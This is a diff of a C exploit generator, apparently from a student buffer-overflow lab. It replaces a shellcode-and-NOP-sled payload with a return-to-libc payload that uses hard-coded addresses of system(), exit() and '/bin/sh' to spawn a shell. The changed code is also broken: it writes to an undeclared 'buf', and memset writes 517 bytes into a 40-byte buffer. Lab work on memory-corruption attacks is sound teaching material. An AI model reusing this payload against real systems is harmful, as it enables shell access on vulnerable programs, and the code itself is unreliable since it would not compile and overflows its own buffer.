@@ -20,24 +20,15 @@ char shellcode[] =
 
 void main(int argc, char **argv)
 {
-	char buffer[517];
+	char buffer[40];
 	FILE *badfile;
 	/* Initialize buffer with 0x90 (NOP instruction) */
 	memset(&buffer, 0x90, 517);
 	/* You need to fill the buffer with appropriate contents here */
 	/* ... Put your code here ... */
-	
-	// Part 1: Address of shellcode
-	long returnAddress = 0xbffff2c5;// or 0xbffff0d8 + 128; // 128 is a value can be decided by myself about from 128 to 240;
-	long *tmp = (long *) buffer;
-	*(tmp + 9) = returnAddress;
-	
-	// Part 2: Filled bytes (done)
-	
-	// Part 3: Shellcode
-	int shellcodeSize = strlen(shellcode);
-	int shellcodeStart = 517 - shellcodeSize;
-	strcpy(buffer + shellcodeStart, shellcode);
+	*(long *) &buf[32] = 0xb7ec582b;   //  "/bin/sh"
+	*(long *) &buf[24] = 0xb7da4da0;   //  system()
+	*(long *) &buf[28] = 0xb7d989d0;   //  exit()
 	
 	/* Save the contents to the file "badfile" */
 	badfile = fopen("./badfile", "w");
